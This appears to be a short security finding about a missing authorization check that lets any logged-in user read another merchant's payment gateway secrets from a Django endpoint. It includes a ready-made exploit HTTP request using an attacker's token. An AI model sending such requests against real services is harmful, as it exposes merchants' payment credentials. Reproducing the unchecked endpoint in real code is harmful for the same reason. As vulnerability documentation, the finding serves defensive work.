diagnosis: The endpoint reads dynamic payment gateway secrets from django-constance using the merchant_id route parameter. It lacks authorization logic verifying that request.user is an administrator of merchant_id, exposing private API secrets and payment credentials of any merchant.
exploit_request:
GET /api/merchants/8812/payment-config/ HTTP/1.1
Host: checkout.ecommerce-engine.io
Authorization: Bearer <attacker_jwt>
